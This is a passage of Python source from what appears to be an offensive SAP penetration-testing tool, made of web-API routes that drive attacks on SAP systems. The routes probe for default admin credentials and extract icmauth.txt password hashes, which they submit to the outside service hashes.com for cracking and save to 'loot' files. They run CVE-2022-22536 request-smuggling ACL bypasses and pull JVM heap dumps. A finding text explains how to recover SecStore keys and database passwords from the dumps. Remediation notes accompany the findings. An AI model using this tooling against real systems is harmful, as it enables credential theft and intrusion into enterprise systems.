                    if r["ok"]:
                        systems = r["systems"]
                        print(f"[+] {sid}: parsed "
                              f"{len(systems)} wdisp/system_* "
                              f"entry/entries from "
                              f"{r['endpoint_used']}")
                        _enrich_wd_backends_from_admin_table(
                            node, systems, state=api.state)
                    else:
                        print(f"[-] {sid}: backend-table extraction "
                              f"failed: {r['error']}")
            else:
                print(f"[-] {sid}: WD admin credentials REJECTED "
                      f"by /sap/wdisp/admin")
                # Status from the (single-attempt) probe
                for att in attempts:
                    print(f"      → user={att['user']!r} live=False "
                          f"status={att.get('status', '?')}")
                # Actionable next steps for the operator — independent
                # verification matters more than re-running through the
                # GUI, because the GUI exposes no extra signal beyond
                # what curl shows.
                vp = (attempts[-1].get("verify_path", "")
                      if attempts else "")
                vh = (attempts[-1].get("https", False)
                      if attempts else False)
                scheme = "https" if vh else "http"
                print(f"[*] {sid}: cross-check with curl from the SAME "
                      f"host you tested the browser from — if curl "
                      f"also gets 401, the WD's icmauth.txt does not "
                      f"have these creds:")
                print(f"      curl -u '{username}:<password>' "
                      f"'{scheme}://{host}:{wd_port}{vp or '/sap/wdisp/admin/icp/navData.icp'}'")
                print(f"[*] {sid}: if curl from your box returns 200 "
                      f"but SAPMAP gets 401, the WD has an IP-based "
                      f"ACL (icm/HTTP/admin_X=CLIENTHOST=...) — run "
                      f"SAPMAP from the allowed source IP.")
                print(f"[*] {sid}: also possible: your earlier browser "
                      f"session was logged in with a different cred, "
                      f"a cached SSO ticket, or a client certificate "
                      f"— retest in a private/incognito browser window "
                      f"to verify the password char-by-char.")

        _bg(f"{sid}:wd_admin_set_creds",
              "WD admin Set Credentials", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/wd_admin_probe_defaults", method="POST")
    def node_wd_admin_probe_defaults(sid):
        """Walk the DEFAULT_WD_CREDENTIALS list and report the first
        one that lands (if any).  Engagement-day safety: at most one
        HTTP request per candidate pair, no retries.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.is_web_dispatcher:
            return json.dumps({"error": "Not a Web Dispatcher node"})
        wd_port, wd_https = 0, False
        for inst in node.instances:
            for p, svc in (inst.ports or {}).items():
                low = (svc or "").lower()
                if low.startswith("wd_"):
                    wd_port = p
                    wd_https = low == "wd_https"
                    break
            if wd_port:
                break
        if not wd_port:
            return json.dumps({"error": "No WD port found on node"})
        host = node.ip or node.hostname

        def _run():
            try:
                from sap_wdisp_admin import (
                    probe_wd_admin_credentials, fetch_wd_systems,
                    DEFAULT_WD_CREDENTIALS,
                )
                print(f"[*] {sid}: probing WD admin default credentials "
                      f"on {host}:{wd_port}"
                      f"{'/HTTPS' if wd_https else '/HTTP'} "
                      f"({len(DEFAULT_WD_CREDENTIALS)} pair(s))")
                live, working, attempts, resolved_https = (
                    probe_wd_admin_credentials(
                        host, wd_port, https=wd_https,
                        timeout=6, saprouter=node.saprouter or "",
                    )
                )
                if resolved_https != wd_https:
                    _set_wd_port_protocol(node, wd_port, resolved_https)
                    print(f"[*] {sid}: WD port {wd_port} protocol auto-"
                          f"corrected to "
                          f"{'wd_https' if resolved_https else 'wd_http'}")
                for att in attempts:
                    print(f"      → user={att['user']!r} "
                          f"live={att['live']} "
                          f"status={att.get('status', '?')}")
                if live and working:
                    print(f"[+] {sid}: DEFAULT CREDENTIALS LIVE — "
                          f"{working[0]} / {working[1]}")
                    node.credentials = [
                        c for c in (node.credentials or [])
                        if not (getattr(c, "kind", "") == "wd_admin"
                                and (getattr(c, "username", "") or "").lower()
                                == working[0].lower())
                    ]
                    node.credentials.append(Credentials(
                        username=working[0], password=working[1],
                        client="", instance="",
                        verified=True, kind="wd_admin",
                    ))
                    emit_finding(
                        "CRITICAL", sid,
                        f"WD admin default credentials LIVE "
                        f"({working[0]} / {working[1]}) — full "
                        f"wdisp/system_* table + parameter readouts "
                        f"+ kernel patch level all reachable without "
                        f"further effort",
                        cve="",
                    )
                    node.findings.append(Finding(
                        name=(f"WD admin default credentials live "
                               f"({working[0]} / {working[1]})"),
                        severity=Severity.CRITICAL,
                        description=(
                            "The SAP Web Dispatcher's /sap/wdisp/admin "
                            "HTTP Basic-auth gate accepted credentials "
                            "from the SAPMAP default-creds wordlist.  "
                            "An unauthenticated attacker on the network "
                            "can read the full wdisp/system_* table "
                            "(every backend SID + MSHOST + MSPORT + "
                            "SSL_ENCRYPT + SRCURL), the WD's kernel "
                            "patch level, the URL permission table, "
                            "trusted-reverse-proxy whitelist, and the "
                            "WD's SAPSSLS.pse certificate store path — "
                            "all without further exploitation effort.  "
                            "Pivots from there: full landscape topology "
                            "exposure, kernel CVE patch-table lookup "
                            "(see ICMAD / 3123396), and lateral creds "
                            "via the SSL key store."
                        ),
                        remediation=(
                            "Change /sap/wdisp/admin credentials to a "
                            "strong unique password.  Set "
                            "icm/HTTP/admin_0=...,CLIENTHOST=<bastion-IP> "
                            "to restrict admin access by source IP.  "
                            "Consider service/sso_admin_user_* for "
                            "client-cert auth instead of Basic."
                        ),
                        detail=(f"User: {working[0]} · Port: "
                                f"{wd_port}{'/HTTPS' if wd_https else ''}"),
                    ))
                    node.has_critical_finding = True
                    # Pull the backend table while we're holding
                    # working creds.
                    print(f"[*] {sid}: pulling wdisp/system_* table "
                          f"with newly-discovered credentials ...")
                    r = fetch_wd_systems(
                        host, wd_port, https=resolved_https,
                        user=working[0], pwd=working[1],
                        timeout=8, saprouter=node.saprouter or "",
                    )
                    if r["ok"]:
                        print(f"[+] {sid}: parsed "
                              f"{len(r['systems'])} wdisp/system_* "
                              f"entry/entries")
                        _enrich_wd_backends_from_admin_table(
                            node, r["systems"], state=api.state)
                    else:
                        print(f"[-] {sid}: backend-table extraction "
                              f"failed: {r['error']}")
                else:
                    print(f"[-] {sid}: no default credentials worked")
            except Exception as e:
                import traceback
                print(f"[-] {sid}: WD admin probe crashed: "
                      f"{type(e).__name__}: {e}")
                traceback.print_exc()

        _bg(f"{sid}:wd_admin_probe_defaults",
              "WD admin Probe Default Credentials", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/wd_extract_icmauth", method="POST")
    def node_wd_extract_icmauth(sid):
        """Extract WD password hashes from icmauth.txt.

        Two paths:
          1. AUTO  — when stored wd_admin credentials exist, try the
                     admin file-viewer endpoints; if any return the
                     icmauth body, parse + auto-lookup on hashes.com.
          2. PASTE — when the operator pasted the file contents in
                     the GUI modal (raw_text in body), skip the
                     download and go straight to parse + lookup.

        On AUTO path, when no endpoint serves the file, returns
        {needs_paste: True, reason: "..."} so the GUI opens the
        paste modal as fallback.  This is the common case — SAP
        locks icmauth.txt behind the OS filesystem on most installs.

        Hashes are saved to ``loot/wd_hashes/`` (parsed JSON + the
        raw icmauth.txt).  Cracked plaintexts get stored on the
        node as ``Credentials(kind="wd_admin")`` so subsequent WD
        operations (Rediscover topology, ICMAD ACL bypass) can use
        them without re-prompting the operator.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.is_web_dispatcher:
            return json.dumps({"error": "Not a Web Dispatcher node"})

        body = request.json or {}
        pasted = (body.get("raw_text") or "").strip()

        # AUTO path — capture wd port + creds for the background thread.
        wd_port, wd_https = 0, False
        for inst in node.instances:
            for p, svc in (inst.ports or {}).items():
                low = (svc or "").lower()
                if low.startswith("wd_"):
                    wd_port = p
                    wd_https = low == "wd_https"
                    break
            if wd_port:
                break

        stored_creds = None
        for c in (node.credentials or []):
            if getattr(c, "kind", "") == "wd_admin":
                stored_creds = (c.username, c.password)
                break

        host = node.ip or node.hostname
        saprouter = node.saprouter or ""
        api_key = _get_local_setting("hashes_com_api_key")

        # If no pasted text AND no stored creds: signal the GUI to open
        # the paste modal (operator hasn't done Add WD admin credentials
        # yet, or the WD admin endpoint doesn't expose icmauth).
        if not pasted and not stored_creds:
            return json.dumps({
                "needs_paste": True,
                "reason": "no stored wd_admin credentials on this node",
            })

        if not pasted and not wd_port:
            return json.dumps({
                "needs_paste": True,
                "reason": "no WD port discovered on this node",
            })

        # Synchronous parse-only path when the operator pasted the body
        # — no network, do it inline so the toast carries the result.
        if pasted:
            return _icmauth_parse_and_lookup(
                node, sid, raw_text=pasted, source="operator_paste",
                api_key=api_key, host=host, port=wd_port,
            )

        # AUTO path runs in a background thread; the GUI tails the
        # console for the lookup result like every other WD action.
        def _run():
            try:
                _run_body()
            except Exception as e:
                import traceback
                print(f"[-] {sid}: icmauth extraction crashed: "
                      f"{type(e).__name__}: {e}")
                traceback.print_exc()

        def _run_body():
            from sap_wdisp_admin import download_icmauth
            print(f"[*] {sid}: attempting icmauth.txt auto-fetch via WD "
                  f"admin file-viewer endpoints")
            r = download_icmauth(
                host, wd_port, https=wd_https,
                user=stored_creds[0], pwd=stored_creds[1],
                timeout=8, saprouter=saprouter,
            )
            if not r["ok"]:
                print(f"[-] {sid}: icmauth auto-fetch failed ({r['error']}) "
                      f"— operator should paste the file contents via the "
                      f"GUI modal (right-click → Extract WD password hashes)")
                emit_finding(
                    "INFO", sid,
                    f"icmauth.txt auto-fetch failed ({r['error']}) — paste "
                    f"manually via the GUI modal to continue extraction",
                    cve="",
                )
                return
            print(f"[+] {sid}: icmauth.txt fetched from {r['endpoint_used']} "
                  f"({len(r['raw_text'])} bytes)")
            _icmauth_parse_and_lookup(
                node, sid, raw_text=r["raw_text"],
                source=f"auto:{r['endpoint_used']}",
                api_key=api_key, host=host, port=wd_port,
            )

        _bg(f"{sid}:wd_extract_icmauth",
              "WD Extract icmauth.txt", _run)
        return json.dumps({"status": "started"})

    def _icmauth_parse_and_lookup(node, sid, *,
                                     raw_text, source, api_key,
                                     host, port):
        """Parse pasted/fetched icmauth.txt, save to loot, and (if
        api_key is set) auto-submit hex digests to hashes.com.

        Returns a JSON-serializable string for the GUI endpoint.
        Also fully prints progress to the console so it works for
        the background-thread auto-fetch path.
        """
        from sap_wdisp_admin import parse_icmauth
        try:
            from sapmap_state import ensure_loot_dir
            loot_dir = ensure_loot_dir("wd_hashes")
        except Exception:
            loot_dir = os.path.join("loot", "wd_hashes")
            os.makedirs(loot_dir, exist_ok=True)

        try:
            parsed = parse_icmauth(raw_text)
        except Exception as e:
            print(f"[-] {sid}: icmauth parse error: {e}")
            return json.dumps({"error": f"parse_error: {e}"})

        if not parsed:
            print(f"[-] {sid}: icmauth contained 0 parseable lines "
                  f"({len(raw_text)} bytes input) — check the format "
                  f"(expected `user:{{SHA384}}<base64>:comment` per line)")
            return json.dumps({
                "ok": False,
                "error": "no_parseable_lines",
                "parsed_count": 0,
            })

        # Persist artefacts to loot.
        import time
        ts = time.strftime("%Y%m%d_%H%M%S")
        host_slug = (host or "unknown").replace(":", "_").replace("/", "_")
        raw_path = os.path.join(
            loot_dir, f"icmauth_{host_slug}_{port}_{ts}.txt")
        parsed_path = os.path.join(
            loot_dir, f"icmauth_{host_slug}_{port}_{ts}_parsed.json")
        try:
            with open(raw_path, "w") as f:
                f.write(raw_text)
            os.chmod(raw_path, 0o600)
            with open(parsed_path, "w") as f:
                json.dump({"source": source, "host": host, "port": port,
                           "entries": parsed}, f, indent=2)
            os.chmod(parsed_path, 0o600)
        except Exception as e:
            print(f"[-] {sid}: icmauth loot write failed: {e}")

        algos = sorted({h.get("algorithm", "?") for h in parsed})
        print(f"[+] {sid}: icmauth parsed — {len(parsed)} hash(es), "
              f"algorithms=[{','.join(algos)}], saved to {raw_path}")

        emit_finding(
            "HIGH", sid,
            f"WD password hashes extracted from icmauth.txt — "
            f"{len(parsed)} user(s) [{','.join(algos)}] now eligible "
            f"for offline cracking / hashes.com rainbow lookup",
            cve="",
            meta={"users": [h["username"] for h in parsed],
                  "algorithms": algos,
                  "source": source},
        )

        # hashes.com auto-lookup — same shape as scc_lookup_hashes_online.
        # Skip when no API key set, or when no hashes have a hashcat mode
        # we can submit (parsed but unknown algorithm).
        if not api_key:
            print(f"[*] {sid}: hashes.com auto-lookup skipped — set "
                  f"`hashes_com_api_key` in Settings to enable rainbow "
                  f"lookups")
            return json.dumps({
                "ok": True,
                "parsed_count": len(parsed),
                "users": [h["username"] for h in parsed],
                "algorithms": algos,
                "hashes_com_attempted": False,
                "hashes_com_skipped_reason": "no API key in Settings",
                "loot_path": raw_path,
                "cracked_count": 0,
            })

        submittable = [h for h in parsed if h.get("hashcat_mode")]
        if not submittable:
            print(f"[-] {sid}: hashes.com auto-lookup skipped — no parsed "
                  f"entries had a known hashcat mode (algorithms=[{algos}])")
            return json.dumps({
                "ok": True,
                "parsed_count": len(parsed),
                "users": [h["username"] for h in parsed],
                "algorithms": algos,
                "hashes_com_attempted": False,
                "hashes_com_skipped_reason": "no known hashcat algorithms",
                "loot_path": raw_path,
                "cracked_count": 0,
            })

        # De-duplicate hex digests; multiple users may share a hash
        # (default factory deployments often do).  hashes.com expects
        # ONE hash per submission, with a fan-out on the response.
        import urllib.request as _urlreq
        import urllib.parse as _urlparse
        import ssl as _ssl

        post_params = [("key", api_key)]
        hash_map = {}  # hex -> list[parsed_record]
        for h in submittable:
            hex_h = h["hash_hex"].lower()
            if hex_h not in hash_map:
                post_params.append(("hashes[]", hex_h))
                hash_map[hex_h] = []
            hash_map[hex_h].append(h)

        print(f"[*] {sid}: hashes.com lookup — submitting "
              f"{len(hash_map)} unique hash(es) "
              f"(across {sum(len(v) for v in hash_map.values())} user(s))")

        try:
            req = _urlreq.Request(
                "https://hashes.com/en/api/search",
                data=_urlparse.urlencode(post_params).encode(),
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "SAPMAP/1.0"},
            )
            ctx = _ssl.create_default_context()
            with _urlreq.urlopen(req, timeout=15, context=ctx) as r:
                resp_body = r.read().decode("utf-8", errors="replace")
            resp = json.loads(resp_body)
        except Exception as e:
            print(f"[-] {sid}: hashes.com API error: {e}")
            return json.dumps({
                "ok": True,
                "parsed_count": len(parsed),
                "users": [h["username"] for h in parsed],
                "algorithms": algos,
                "hashes_com_attempted": True,
                "hashes_com_error": str(e),
                "loot_path": raw_path,
                "cracked_count": 0,
            })

        if not resp.get("success"):
            err = resp.get("message", "unknown error")
            print(f"[-] {sid}: hashes.com: {err}")
            return json.dumps({
                "ok": True,
                "parsed_count": len(parsed),
                "users": [h["username"] for h in parsed],
                "algorithms": algos,
                "hashes_com_attempted": True,
                "hashes_com_error": err,
                "loot_path": raw_path,
                "cracked_count": 0,
            })

        # Process founds — store cracked passwords as wd_admin credentials.
        cracked_count = 0
        cracked_users = []
        for item in (resp.get("founds") or []):
            hex_h = (item.get("hash") or "").lower()
            plaintext = item.get("plaintext", "")
            users_for_hash = hash_map.get(hex_h, [])
            if not users_for_hash or not plaintext:
                continue
            for original in users_for_hash:
                username = original.get("username", "?")
                cracked_count += 1
                cracked_users.append(username)
                # Store as wd_admin credential.  Keep any verified
                # cred we already have for that user; otherwise add.
                already = False
                for c in (node.credentials or []):
                    if (getattr(c, "kind", "") == "wd_admin"
                            and (getattr(c, "username", "") or "").lower()
                                == username.lower()
                            and (getattr(c, "password", "") or "")
                                == plaintext):
                        already = True
                        break
                if not already:
                    node.credentials.append(Credentials(
                        username=username, password=plaintext,
                        client="", instance="",
                        verified=False, kind="wd_admin",
                    ))
                print(f"[+] {sid}: hashes.com cracked {username} → "
                      f"plaintext stored as wd_admin credential")
                emit_finding(
                    "CRITICAL", sid,
                    f"WD admin password cracked for '{username}' via "
                    f"hashes.com rainbow table — plaintext stored as "
                    f"wd_admin credential, full /sap/wdisp/admin access",
                    cve="",
                    meta={"username": username,
                          "algorithm": original.get("algorithm", ""),
                          "source": "hashes.com",
                          "icmauth_source": source},
                )
                # Append to cracked-loot file
                try:
                    cracked_path = os.path.join(loot_dir,
                                                  "hashes_cracked.txt")
                    with open(cracked_path, "a") as fh:
                        fh.write(f"{host_slug}:{port}:"
                                  f"{username}:{plaintext}\n")
                    os.chmod(cracked_path, 0o600)
                except Exception:
                    pass

        cost = resp.get("cost", 0)
        print(f"[*] {sid}: hashes.com lookup complete — cracked "
              f"{cracked_count}/{len(parsed)} user(s), cost={cost} credits")

        return json.dumps({
            "ok": True,
            "parsed_count": len(parsed),
            "users": [h["username"] for h in parsed],
            "algorithms": algos,
            "hashes_com_attempted": True,
            "cracked_count": cracked_count,
            "cracked_users": cracked_users,
            "cost": cost,
            "loot_path": raw_path,
        })

    @app.route("/api/node/<sid>/check_cve_2022_22536", method="POST")
    def node_check_cve_2022_22536(sid):
        """Probe a node for CVE-2022-22536 (ICMAD) — HTTP request smuggling.

        Combines the SAP-Note-3123396 patch table lookup against the
        node's kernel + PL, and a live smuggle probe (Onapsis-style
        82646-byte payload) on every discovered ICM port.  Strictly
        opt-in per the locked design (no auto-fire from scanners).

        Severity ladder:
          * Live probe confirms 2-response signature       → HIGH
          * Patch table flags kernel but no live signal    → INFO
          * Probe negative AND kernel >= fix boundary      → no finding
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        # Allow ABAP, Java, dual-stack — and standalone Web Dispatchers
        # (which SAPNode now flags via is_web_dispatcher).
        sys_type = (node.system_type or "").upper()
        in_scope = (
            any(tag in sys_type for tag in ("ABAP", "JAVA"))
            or node.is_web_dispatcher
        )
        if not in_scope:
            return json.dumps({
                "error": ("Not an ABAP / Java / Web-Dispatcher node — "
                          "ICMAD only applies to ICM-fronted systems")
            })

        def _run():
            print(f"[*] {sid}: Checking CVE-2022-22536 (ICMAD)...")
            try:
                found = sapmap_scanner.check_cve_2022_22536(node)
            except Exception as e:
                print(f"[-] {sid}: ICMAD probe failed: {e}")
                return
            if node.cve_2022_22536_vulnerable:
                print(f"[+] {sid}: VULNERABLE — smuggle confirmed on port "
                      f"{node.cve_2022_22536_port}"
                      f"{'/HTTPS' if node.cve_2022_22536_https else '/HTTP'}"
                      f" · {node.cve_2022_22536_evidence[:120]}")
            elif found:
                # Patch-table-only finding (info severity)
                print(f"[!] {sid}: patch-hygiene only — kernel behind fix "
                      f"boundary, no live smuggle signature observed")
            else:
                print(f"[*] {sid}: not vulnerable (probe + patch-table both clean)")

        _bg(f"{sid}:check_cve_22536", "Check CVE-2022-22536 (ICMAD)", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/icmad_acl_bypass", method="POST")
    def node_icmad_acl_bypass(sid):
        """Run the D.2 ACL-bypass sweep against the curated path catalogue.

        Enabled only after D.1 detection confirms the node has the bug
        (``cve_2022_22536_vulnerable=True``).  Iterates 12 hand-picked
        admin / recon paths via the SAPGateBreaker-style TE-chunked
        smuggle and reports each one's verdict.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.cve_2022_22536_port:
            return json.dumps({
                "error": ("Run Check CVE-2022-22536 first to find a "
                          "vulnerable ICM port")
            })

        # Snapshot the request payload NOW, before the background
        # thread starts.  Bottle's `request` object is thread-local —
        # accessing it from inside _run() (which runs after this
        # handler has returned) raises and silently kills the thread,
        # which is why the previous version of this handler produced
        # zero terminal output despite the "started" popup.
        try:
            body_snapshot = request.json or {}
        except Exception:
            body_snapshot = {}
        outer_path_param = body_snapshot.get("outer_path", "/sap/wzip?aaa") \
                              or "/sap/wzip?aaa"

        def _run():
            # Belt-and-braces: wrap the entire body so any unexpected
            # exception surfaces to the console instead of silently
            # killing the daemon thread (which is what hid the
            # request.json bug for the previous build).
            try:
                _run_acl_bypass_body()
            except Exception as e:
                import traceback
                print(f"[-] {sid}: ICMAD ACL-bypass sweep crashed: "
                      f"{type(e).__name__}: {e}")
                traceback.print_exc()

        def _run_acl_bypass_body():
            from sap_cve_2022_22536 import run_acl_bypass
            host = node.ip or node.hostname
            port = node.cve_2022_22536_port
            https = node.cve_2022_22536_https
            outer_path = outer_path_param

            print(f"[*] {sid}: ICMAD ACL-bypass sweep on "
                  f"{host}:{port}{'/HTTPS' if https else '/HTTP'} "
                  f"(outer={outer_path})")
            verdicts = run_acl_bypass(host, port, https=https,
                                        saprouter=node.saprouter or "",
                                        outer_path=outer_path,
                                        verbose=True)
            confirmed = [(p, r) for p, r in verdicts["results"].items()
                          if r["bypass_confirmed"]]
            node.cve_2022_22536_acl_bypass = {
                p: {"status": r["smuggled_status"],
                    "snippet": r["smuggled_snippet"][:160],
                    "via": "smuggle" if r["bypass_confirmed"] else "blocked"}
                for p, r in verdicts["results"].items()
            }
            for path, r in confirmed:
                sev = ("CRITICAL" if r["admin_grade"] == "critical"
                        else "HIGH" if r["admin_grade"] == "high"
                        else "MEDIUM")
                emit_finding(
                    sev, sid,
                    f"ICMAD ACL bypass: {path} reached via desync "
                    f"(baseline={r['baseline_status']} → "
                    f"smuggled={r['smuggled_status']})",
                    cve="CVE-2022-22536",
                    attack_capability="exploit.cve_2022_22536",
                )
                if not any(f.detail and path in f.detail
                              and f.name.startswith("CVE-2022-22536")
                              for f in node.findings):
                    severity_obj = (Severity.CRITICAL
                                     if r["admin_grade"] == "critical"
                                     else Severity.HIGH
                                     if r["admin_grade"] == "high"
                                     else Severity.MEDIUM)
                    node.findings.append(Finding(
                        name=(f"CVE-2022-22536 — ACL bypass "
                              f"({r['admin_grade'].upper()}): {path}"),
                        severity=severity_obj,
                        description=(
                            f"The smuggled inner request to {path} reached "
                            f"a backend handler that was supposed to be "
                            f"gated by the Web Dispatcher's "
                            f"wdisp/permission_table.  Baseline direct "
                            f"GET returned {r['baseline_status']}; "
                            f"smuggled GET via CVE-2022-22536 returned "
                            f"{r['smuggled_status']}.  {r['rationale']}"
                        ),
                        remediation=(
                            "Patch CVE-2022-22536 per SAP Note 3123396 — "
                            "URL-filter hardening alone does not stop the "
                            "smuggle.  If patch can't ship, set "
                            "wdisp/additional_conn_close=1 per SAP Note "
                            "3138881 (deprecated workaround, but blocks "
                            "the inter-request bleed)."
                        ),
                        detail=(f"Path {path} · downstream="
                                f"{r['downstream'] or 'recon-only'}"),
                    ))
                    if r["admin_grade"] in ("critical", "high"):
                        node.has_critical_finding = True
            if confirmed:
                print(f"[+] {sid}: ICMAD ACL bypass confirmed on "
                      f"{len(confirmed)} path(s): "
                      f"{', '.join(p for p, _ in confirmed)}")
            else:
                print(f"[*] {sid}: ICMAD ACL-bypass sweep complete — "
                      f"no path bypassed the WD's permission table")

        _bg(f"{sid}:icmad_acl_bypass", "ICMAD ACL Bypass Sweep", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/icmad_heapdump_pull", method="POST")
    def node_icmad_heapdump_pull(sid):
        """D.3 — pull an HPROF heap dump via the ICMAD smuggle bypass.

        Two-step UX:
          1. POST with no ``dump`` field → list available heap dumps
             on the target.  Returns ``{"dumps": [...]}``.
          2. POST with ``dump=<filename>`` → download that dump to the
             loot directory.  Streams; emits ``icmad.heapdump.captured``
             finding (CRITICAL) on success.

        Enabled only after D.2 confirmed bypass to ``/heapdump/`` (i.e.
        ``node.cve_2022_22536_acl_bypass['/heapdump/']['via'] ==
        'smuggle'``).  Per locked decision 2, D.3 ships in v1.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.cve_2022_22536_port:
            return json.dumps({
                "error": "Run Check CVE-2022-22536 first"
            })
        body = request.json or {}
        dump_name = body.get("dump", "")
        outer_path = body.get("outer_path", "/sap/wzip?aaa")

        host = node.ip or node.hostname
        port = node.cve_2022_22536_port
        https = node.cve_2022_22536_https

        if not dump_name:
            # Step 1: list dumps (synchronous, fast)
            from sap_cve_2022_22536 import list_heap_dumps
            try:
                r = list_heap_dumps(host, port, https=https,
                                      saprouter=node.saprouter or "",
                                      outer_path=outer_path,
                                      verbose=True)
            except Exception as e:
                return json.dumps({"error": f"list failed: {e}"})
            return json.dumps({"dumps": r["dumps"],
                                "reachable": r["reachable"],
                                "snippet": r["snippet"][:300]})

        # Step 2: download (async, can be slow)
        def _run():
            import os, time
            from sap_cve_2022_22536 import download_heap_dump
            # Project-rooted loot dir (loot/<sid>/) — matches the
            # convention from sapmap_state.ensure_loot_dir() so all
            # SAPMAP artefacts land alongside the source tree, not
            # under ~/.sapmap/.  Already covered by .gitignore.
            try:
                from sapmap_state import ensure_loot_dir
                loot_dir = ensure_loot_dir(sid)
            except Exception:
                loot_dir = "/tmp"
            ts = time.strftime("%Y%m%d_%H%M%S")
            base = os.path.basename(dump_name).replace("/", "_") or "heapdump"
            save_to = os.path.join(loot_dir,
                                     f"icmad_{ts}_{base}.hprof")

            def _progress(n):
                mb = n / (1024 * 1024)
                if int(mb) % 10 == 0:
                    print(f"[*] {sid}: heap-dump pull progress {mb:.0f} MB")

            print(f"[*] {sid}: starting ICMAD heap-dump pull of "
                  f"{dump_name} → {save_to}")
            r = download_heap_dump(host, port, dump_name, https=https,
                                     saprouter=node.saprouter or "",
                                     outer_path=outer_path,
                                     save_to=save_to,
                                     progress_cb=_progress)
            if r["bytes_written"] > 0 and r["complete"]:
                mb = r["bytes_written"] / (1024 * 1024)
                print(f"[+] {sid}: ICMAD heap-dump CAPTURED — {mb:.1f} MB "
                      f"saved to {r['saved_to']}")
                emit_finding(
                    "CRITICAL", sid,
                    f"ICMAD: HPROF heap dump captured "
                    f"({mb:.0f} MB) via CVE-2022-22536 bypass",
                    cve="CVE-2022-22536",
                    attack_capability="exploit.cve_2022_22536",
                )
                node.findings.append(Finding(
                    name="CVE-2022-22536 — HPROF heap dump captured",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Successfully downloaded a JVM heap dump "
                        f"({mb:.1f} MB) from the AS Java backend by "
                        f"smuggling a GET request past the Web "
                        f"Dispatcher's wdisp/permission_table.  The "
                        f"HPROF file contains the SecStoreFS keyphrase "
                        f"bytes, JCo destination passwords in cleartext, "
                        f"SAPLogonTicket signing key fragments, and "
                        f"active session tokens for high-value users.  "
                        f"To recover the SecStore master key offline, "
                        f"feed the saved HPROF through an HPROF parser "
                        f"(jhat / IBM HeapAnalyzer / strings -a) and "
                        f"locate the SecStoreFS._keyBytes 20-byte array. "
                        f"From there, the same XOR deobfuscation +"
                        f"PBKDF2 decrypt flow in "
                        f"modules/data_extraction/sapmap_secstore.py "
                        f"recovers SAP<SID>DB passwords and JCo "
                        f"destination secrets."
                    ),
                    remediation=(
                        "Patch CVE-2022-22536 per SAP Note 3123396 to "
                        "prevent the smuggle from reaching /heapdump/. "
                        "Additionally: restrict /heapdump/ via the AS "
                        "Java security role, or unbind the heapdump "
                        "ICF service entirely if not needed for "
                        "production debugging."
                    ),
                    detail=f"HPROF saved to {r['saved_to']}",
                ))
                node.has_critical_finding = True
                node.pwned = True
            else:
                print(f"[-] {sid}: ICMAD heap-dump pull incomplete — "
                      f"{r['bytes_written']} bytes, "
                      f"err={r['error'] or 'partial'}")

        _bg(f"{sid}:icmad_heapdump", "ICMAD Heap-Dump Pull", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_cve_2020_6287", method="POST")
    def node_check_cve_2020_6287(sid):
        """Probe Java ports for CVE-2020-6287 (RECON)."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java / double-stack system"})

        def _run():
            print(f"[*] {sid}: Checking CVE-2020-6287 (RECON / "
                  f"LM Configuration Wizard)...")
            found = sapmap_scanner.check_cve_2020_6287(node)
            if found:
                print(f"[+] {sid}: VULNERABLE — port "
                      f"{node.cve_2020_6287_port} · "
                      f"{node.cve_2020_6287_evidence}")
            elif node.cve_2020_6287_evidence:
                print(f"[*] {sid}: not vulnerable "
                      f"({node.cve_2020_6287_evidence})")
            else:
                print(f"[*] {sid}: no Java HTTP port responded")

        _bg(f"{sid}:check_cve_6287", "Check CVE-2020-6287", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_cve_2025_31324", method="POST")
    def node_check_cve_2025_31324(sid):
        """Probe Java ports for CVE-2025-31324 (metadatauploader unauth RCE).

        Only meaningful for Java / double-stack systems — returns an error
        for pure ABAP nodes rather than silently succeeding.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        sys_type = (node.system_type or "").upper()
        if "JAVA" not in sys_type:
            return json.dumps({"error": "Not a Java / double-stack system — "
                                         "CVE-2025-31324 does not apply"})

        def _run():
            print(f"[*] {sid}: Checking CVE-2025-31324 "
                  f"(VisualComposer metadatauploader)...")
            found = sapmap_scanner.check_cve_2025_31324(node)
            if found:
                print(f"[+] {sid}: VULNERABLE — port "
                      f"{node.cve_2025_31324_port} · {node.cve_2025_31324_evidence}")
            elif node.cve_2025_31324_evidence:
                print(f"[*] {sid}: not vulnerable ({node.cve_2025_31324_evidence})")
            else:
                print(f"[*] {sid}: no Java HTTP port responded")

        _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_linux_lpe", method="POST")
    @app.route("/api/node/<sid>/check_copyfail",  method="POST")  # legacy alias
    def node_check_linux_lpe(sid):
        """Probe both Copy Fail (CVE-2026-31431) and Dirty Frag.  The
        auto-picker reports which technique is viable + which it would
        select.  Legacy ``/check_copyfail`` path still works."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            _task_start(f"{sid}:check_linux_lpe",
                        f"{sid}: checking Linux root LPE")
            try:
                from sapmap_lpe_auto import check_linux_lpe
                res = check_linux_lpe(node)
                method = res.get("method") or ""
                cf = res.get("copyfail") or {}
                pc = res.get("peditcow") or {}
